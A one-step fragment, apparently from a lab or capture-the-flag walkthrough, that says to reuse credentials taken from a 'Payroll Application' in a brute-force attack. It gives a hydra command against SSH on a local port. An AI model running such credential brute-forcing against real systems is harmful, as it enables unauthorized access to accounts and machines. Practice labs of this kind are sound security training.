1. After extracting credentials from the Payroll Application, use the credentials to run a bruteforce attack.

```
hydra -L user.txt -P pass.txt ssh://127.0.0.1:2222
```
